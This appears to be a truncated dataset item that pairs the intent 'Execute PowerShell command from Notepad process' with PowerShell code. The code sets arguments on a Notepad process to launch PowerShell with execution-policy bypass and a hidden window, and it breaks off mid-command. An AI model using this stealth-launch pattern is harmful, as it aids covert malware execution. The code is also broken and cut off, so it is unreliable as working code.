# Natural language intent:
# Execute PowerShell command from Notepad process

$process = Get-Process -Name "notepad.exe" $process.StartInfo.Arguments = "-c powershell -ep bypass -nop -w hidden -c \"I
